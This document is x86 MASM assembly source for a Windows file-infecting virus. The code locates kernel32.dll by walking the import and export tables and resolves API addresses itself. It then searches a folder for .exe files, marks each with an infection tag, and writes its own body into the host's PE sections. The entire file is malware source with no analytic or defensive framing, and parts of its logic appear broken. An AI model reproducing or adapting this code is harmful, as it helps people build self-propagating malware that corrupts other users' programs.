.586
.model flat,stdcall
option casemap:none
   include windows.inc
   include user32.inc
   include kernel32.inc
   include masm32.inc
   include masm32rt.inc
   includelib user32.lib
   includelib kernel32.lib
   includelib masm32.lib
.data
FindFirstFileError              		BYTE                        "FindFirstFile failed ", 0
FindFirstFileSuccess            		BYTE                        "First file found with success ", 0
FindNextFileError               		BYTE                        "FindNextFile failed ", 0
FindNextFileSuccess             		BYTE                        "FirstNextFile found with success ", 0
FolderFound           		  		    BYTE                        "Folder found", 0
PATH					                db			                "C:\Documents and Settings\Administrator\Desktop\virus\",0
.code
; ------------------------------------------------------------------------------------------------------------------;
virusCode:
	pushad
	pushfd
	call delta
delta: 
	pop ebp
	mov eax,ebp
	sub ebp,delta
	sub eax,offset delta - offset virusCode
	sub eax,00001000h
	mov [ebp+image_base],eax			; save image base
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;--------------------------------------------Find import section---------------------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	mov esi,[image_base+ebp]			; point on image base
	add eax,3ch					; At offset 3ch is the dword 'header relocation'.This value here= offset begin (PE header)  
	mov eax,[eax]					; get the value (PE header value)
	add eax,esi					; +image_base (point to PE header)
	add eax,128					; +80H (import directory RVA)
	mov eax,[eax]					; get value at this current eax
	add eax,esi					; now point to import table (+ image_base)
	add eax,12					; +CH (point to .dll)   
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;-----------------------------------------------Scan import---------------------------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
find_kernel32:
	xor ebx,ebx					; reset ebx
	cmp dword ptr[eax],ebx				; cmp if value tai eax=0
	je end_objecttable				; if= jmp to end_objectable
	call is_it_kernel32				; else check if it is kernel32
	cmp ecx,3					; check if return value=3
	jae find_kernel_image_base			; if return>=3 jmp find kernel32 image base
	add eax,20					; else move to another .dll file
	jmp find_kernel32				; find again
	
find_kernel_image_base:					; go to find kernel in image base
	mov eax,[eax+4]					; point to list API address pointer
	add eax,esi					; + image_base
	mov eax,[eax]					; now eax=address of 1st API from kernel32
	xchg edi,eax					; swap with edi, edi=address of 1st API
find_MZ_in_kernel:
	dec edi						; decrease edi
	mov esi,edi					;	 
	cmp word ptr [edi],"ZM"				; check MZ
	jne find_MZ_in_kernel				; not found then loop

	mov esi,edi
	mov esi,[esi+3CH]				; if ok, move to header relocation then get value
	cmp esi,dword  ptr 200H				; cmp if header reloc=200H
	ja find_MZ_in_kernel				; if >200H jmp then loop
	
	add esi,edi					; go to new header
	cmp word ptr [esi],"EP"				; check PE
	jne find_MZ_in_kernel				; no loop again
	add esi,52					; point to image_base_dword
	cmp edi,[esi]				        ; check if edi=image_base 
	jne find_MZ_in_kernel				; loop again
	
	mov esi,edi					; esi=image base of kernel32.dll 
	add esi,3CH					; mov to header relocation
	mov esi,[esi]					; get value
	add esi,edi					; +image base => PE header
	add esi,120					; move to export table
	mov esi,[esi]					; get value
	add esi,edi					; +image_base->esi point to the export table !!!
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;----------------------------------------------Get Win API---------------------------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
find_API:
	push ebp
	call find_ProcAddress					; Find address of func GetProcAddress
	mov ebx,[esp]						; done 
	mov dword ptr [ebx+GetProcAddressAddress],ebp		; save address 
	pop ebp
	
	push ebp
	call find_GetModuleHandle				; Find address of func GetModuleHandle
	mov ebx,[esp]
	mov dword ptr [ebx+GetModuleHandleAddress],ebp
	pop ebp
	
	lea eax,offset kernel_string				; load kernel32.dll name
	add eax,ebp
	push eax
	call [ebp+GetModuleHandleAddress]
	mov dword ptr [ebp+handle],eax				; save module handle to mem
	
	call find_APIAddress					; now get api address 
	
	lea eax,offset path_C					; set path to do function findfirstfile
	add eax,ebp
	push eax
	call [ebp+SetCurrentDirectoryAddress]			; call setcurrentdirectory
	call find_first_file					; call findfirstfile
	
	invoke ExitProcess,0
	push dword ptr[ebp+virtual_out] 			; make 1st 1000 byte (for virus can write data)
	push 80h						; writeable
	push 1000h						; 1000 bytes
	push dword ptr[ebp+image_base]
	call [ebp+VirtualProtectAddress]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;---------------------------------------------Find & Infect--------------------------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
find_first_file:
	lea eax,[ebp+offset win32_find_data]
	push eax
	lea eax,[ebp+offset search_mask]
	push eax
	call [ebp+FindFirstFileAAddress]
find_next_file:
	cmp eax,0
	je done_find
	mov dword ptr[ebp+search_handle],eax
	lea eax,[ebp+win32_find_data.FileName]
	xor eax,eax
	call infect_file
	lea eax,[ebp+ offset win32_find_data]
	push eax
	push dword ptr[ebp+search_handle]
	call [ebp+FindNextFileAAddress]
	jmp find_next_file
close_file_handle:
	push dword ptr[ebp+search_handle]
	call [ebp+CloseHandleAddress]
done_find:
	ret
infect_file:
    	call open_file
    	cmp eax,0
    	je open_fail
    	mov ecx,dword ptr[ebp+win32_find_data.FileSizeLow]
    	call create_file_mapping
    	cmp eax,0
    	je create_file_mapping_fail
    	call map_into_mem
    	cmp eax,0
    	je map_into_mem_fail
    	call infecting
map_into_mem_fail:
    	call unmap_into_mem
create_file_mapping_fail:
   	call uncreate_file_mapping
open_fail:
   	call uncreate_file_handle
  	ret
infecting:
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	
	mov eax,[ebp+mem_map_handle]
	;add eax,3ch
	mov ecx,[eax+3ch]
	add ecx,[ebp+mem_map_handle]
	mov eax,ecx    ; point to PE header of host
	add eax,18h
	add eax,52	   ; point to reverse bit (infection mark)
	
	cmp dword ptr[eax],"nauq"
	je file_not_infect
	
	mov eax,ecx
	add eax,6
	mov esi,eax
	mov eax,[eax]
	mov dword ptr[ebp+host_no_sect],eax   ; number of sections 
	
	mov eax,esi
	add eax,14
	mov esi,eax
	mov eax,[eax]
	mov dword ptr[ebp+host_opt_size],eax  	; option header size
	
	mov eax,esi
	add eax,36
	mov esi,eax
	mov eax,[eax]
	mov dword ptr[ebp+host_sec_alig],eax
	
	mov eax,esi
	add eax,4
	mov esi,eax
	mov eax,[eax]
	mov [ebp+host_sec_alig],eax
	
	lea eax,[ebp+host_sec_alig]
	lea edx,[ebp+host_no_sect]
	mul edx
	
	push eax
	mov eax,ecx
	add eax,18h
	add eax,10h
	pop edx
	mov [eax],edx
	mov [ebp+host_new_entry],edx
	
	mov eax,ecx    ; reloc section table
	
	add eax,18h
	add ax,[ebp+host_opt_size]
	push eax
	
	mov eax,28h
	mov dx,[ebp+host_no_sect]
	dec dx
	mul dx
	pop edx
	
	add edx,eax   ; edx point to reloc section table
	mov [ebp+host_rel_tab],edx
	
	add edx,8				; edx point to virtual size
	mov edx,virus_size          ; set the size of the section
	mov eax,edx
	
	push ecx
	push edx
	xor ecx,ecx
	mov ecx,[ebp+host_file_alig]
	mul ecx
	pop edx
	pop ecx
	mov edx,eax
	
	mov eax,ecx
	add eax,18h
	add eax,52
	
	mov dword ptr[eax],"nauq"
	mov eax,[ebp+host_rel_tab]
	add eax,24
	mov dword ptr[eax],0F0000060H
	
	mov eax,ecx
	add eax,18h
	add eax,3ch
	mov eax,[eax]
	mov [ebp+host_new_entry],eax
	
	sub eax,eax
	mov esi,[ebp+virusCode]
	mov ax,[ebp+host_no_sect]
	push ecx
	sub ecx,ecx
	mov ecx,[ebp+host_file_alig]
	mul cx
	pop ecx
	push eax
	mov eax,[ebp+mem_map_handle]
	add eax,[ebp+host_new_entry]
	pop edx
	add eax,edx
	mov edi,eax
	sub ecx,ecx
	mov cx,[ebp+virus_size]
	rep movsb
	ret
file_not_infect:
 	ret
open_file:
	xor eax,eax
	push eax
    	push eax
    	push 00000003h
   	push eax
   	inc eax
    	push eax
   	push 0c0000000h
    	lea eax,[ebp+win32_find_data.FileName] 
    	add eax,ebx
    	push eax 
    	call [ebp+CreateFileAAddress]        ;Gets the File Handle for use in CreateFileMapping
    	mov dword ptr[ebp+file_handle],eax 
   	ret
create_file_mapping:
	xor eax,eax
	push eax
    	push ecx
    	push eax
    	push 04h
    	push eax
    	push dword ptr[ebp+file_handle]
    	call [ebp+CreateFileMappingAAddress]
    	mov dword ptr[ebp+file_map_handle],eax
    	ret
map_into_mem:
    	push dword ptr[ebp+win32_find_data.FileSizeHigh]
    	push 0
    	push 0
    	push 02h
    	push eax
    	call [ebp+MapViewOfFileAAddress]
    	mov dword ptr[ebp+mem_map_handle],eax
    	ret
unmap_into_mem:
    	push dword ptr[ebp+mem_map_handle]
    	call [ebp+UnmapViewOfFileAddress]
    	ret
uncreate_file_mapping:
    	push dword ptr[ebp+file_map_handle]
    	call [ebp+CloseHandleAddress]
    	ret
uncreate_file_handle:
    	push dword ptr[ebp+file_handle]
   	call [ebp+CloseHandleAddress]
    	ret
		
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;---------------------------Check kernel32 function----------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;			
is_it_kernel32: 				; check is it kernel32.dll
	xor ecx,ecx				; reset ecx
	mov ebx,dword ptr [eax]		; set ebx=[eax]
	add ebx,esi				; add image_base
	cmp dword ptr[ebx],"nrek"	; cmp with Kern
	jne ker1				; if not equal jmp to az1
	inc ecx				; else ecx+=1
ker1:		
	cmp dword ptr[ebx+4],"23le"	; mov to next 4 bit then cmp with "el32"
	jne ker2				; if not jmp to az2
	inc ecx				; else ecx+=1
ker2:	
	cmp dword ptr[ebx+8],"lld."	;
	jne ker3				;
	inc ecx				; else ecx+=1
ker3:	
ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;------------------- Get Address of GetProcAddress API-------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
find_ProcAddress:
	xor eax,eax
	xor ecx,ecx
	xor edx,edx
	xor ebp,ebp
	
	inc edx
	mov eax,esi
	mov ebp,esi
	
	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
	add eax,32			; 
	
	mov ebp,[ebp]
	add ebp,edi
	
	mov eax,[eax]
	add eax,edi
	
	mov ebx,eax
	mov eax,[ebx]
	add eax,edi
search_procaddress:
	cmp dword ptr[eax],"PteG"
	je search_procadress_1
back_search_procadress:
	add ebx,4
	inc edx
	mov eax,[ebx]
	add eax,edi
	add ebp,4
	jmp search_procaddress
search_procadress_1:	
	cmp dword ptr[eax+4],"Acor"
	jne back_search_procadress
	inc ecx
search_procadress_2:
	cmp dword ptr[eax+8],"erdd"
	jne back_search_procadress
	inc ecx
search_procadress_3:
	cmp word ptr[eax+12],"ss"
	jne back_search_procadress
	inc ecx
search_procadress_4:
	mov ebp,[ebp]
	add ebp,edi
	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;------------------- Get Address of GetModuleHandle API -----------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;		
find_GetModuleHandle:
	xor eax,eax
	xor ecx,ecx
	xor edx,edx
	xor ebp,ebp
	
	inc edx
	mov eax,esi
	mov ebp,esi
	
	add ebp,28			; ebp now points to RVA of List of Function Addresses    	
	add eax,32			; 
	
	mov ebp,[ebp]
	add ebp,edi
	
	mov eax,[eax]
	add eax,edi
	
	mov ebx,eax
	mov eax,[ebx]
	add eax,edi
search_module:	
	cmp dword ptr[eax],"MteG"
	je search_module_1
back_search_module:
	add ebx,4
	inc edx
	mov eax,[ebx]
	add eax,edi
	add ebp,4
	jmp search_module
search_module_1:
	cmp dword ptr[eax+4],"ludo"
	jne back_search_module
	inc ecx
search_module_2:
	cmp dword ptr[eax+8],"naHe"
	jne back_search_module
	inc ecx
search_module_3:
	cmp dword ptr[eax+12],"Aeld"
	jne back_search_module
	inc ecx
search_module_4:
	mov ebp,[ebp]
	add ebp,edi
	ret	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;------------------- Get Address of Win API function --------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
find_APIAddress:
	lea eax,offset FindFirstFileAStr
	add eax,ebp
	push eax
	push dword ptr[ebp+handle]                  ; module handle
	call [ebp+GetProcAddressAddress]
	mov [ebp+FindFirstFileAAddress],eax	
	
	lea eax,offset FindNextFileAStr
	add eax,ebp
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+FindNextFileAAddress],eax
	
	lea eax,offset CreateFileAStr
	add eax,ebp
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+CreateFileAAddress],eax
	
	lea eax,offset CreateFileMappingStr 
	add eax,ebp
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+CreateFileMappingAAddress],eax
	
	lea eax,offset CloseHandleStr  
	add eax,ebp
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+CloseHandleAddress],eax
	
	lea eax,offset VirtualProtectStr
	add eax,ebp
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+VirtualProtectAddress],eax 
	
	lea eax,offset SetCurrentDirectoryStr
	add eax,ebp
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+SetCurrentDirectoryAddress],eax 
	
	lea eax,[ebp+ offset MapViewOfFileStr]
	push eax
	push dword ptr [ebp+handle]
	call [ebp+GetProcAddressAddress]
	mov [ebp+MapViewOfFileAAddress],eax
	ret
end_objecttable: 
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;--------------------------------Data---------------------------------------------;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

image_base    				dd    0h 
kernel_string   		      	db    "kernel32.dll", 0 
search_mask    				db    "*.exe", 0
path_C					db	"C:\Documents and Settings\Administrator\Desktop\virus\",0 
handle       				dd    0h
GetProc     				dd    0h
file_handle    				dd    0h
GetMod       				dd    0h
delta_var    				dd    0h
map_handle    				dd    0h
file_map_handle    			dd    0h
mem_map_handle    			dd    0h
host_opt_size    				dw    0h
host_no_sect    				dw    0h
host_file_alig   				dd    0h
host_sec_alig    				dd    0h
host_relc_raw    				dd    0h
virtual_out    				dd    0h
search_handle    				dd    0h
host_rel_tab    				dd    0h
host_new_entry    			dd    0h    
virus_size 					equ (virus_end-virusCode)
Win32FindData struct
      FileAttributes           	dd 0              ;attributes
      CreationTime             	dd 0,0            ;time of creation
      LastAccessTime           	dd 0,0            ;last access time
      LastWriteTime            	dd 0,0            ;last modification
      FileSizeHigh             	dd 0              ;filesize
      FileSizeLow              	dd 0              ; "
      Reserved0                	dd 0
      Reserved1                	dd 0
      FileName                 	db 260 dup(?)         ;long filename
      AlternateFileName        	db 13  dup(?)         ;short filename
Win32FindData ends
win32_find_data Win32FindData {}
APIName:
	FindFirstFileAStr    		db    "FindFirstFileA", 0 
	FindNextFileAStr    		db    "FindNextFileA", 0 
	CreateFileAStr        		db    "CreateFileA" , 0
	CreateFileMappingStr    	db    "CreateFileMappingA", 0 
	MapViewOfFileStr    		db    "MapViewOfFile", 0 
	GetProcAddressStr    		db    "GetProcAddress" , 0 
	GetModuleHandleAStr    		db    "GetModuleHandleA", 0 
	UnmapViewOfFileStr    		db    "UnmapViewOfFile", 0 
	CloseHandleStr        		db    "CloseHandle", 0 
	VirtualProtectStr    		db    "VirtualProtect", 0
	SetCurrentDirectoryStr		db    "SetCurrentDirectoryA", 0
APIAddress:
	FindNextFileAAddress    	dd    0h
	FindFirstFileAAddress   	dd    0h
	CreateFileAAddress       	dd    0h
	CreateFileMappingAAddress   	dd    0h
	MapViewOfFileAAddress 	 	dd    0h
	GetModuleHandleAddress  	dd    0h
	GetProcAddressAddress   	dd    0h 
	UnmapViewOfFileAddress   	dd    0h
	CloseHandleAddress        	dd    0h
	VirtualProtectAddress    	dd    0h
	SetCurrentDirectoryAddress 	dd    0h
virus_end:	
end virusCode
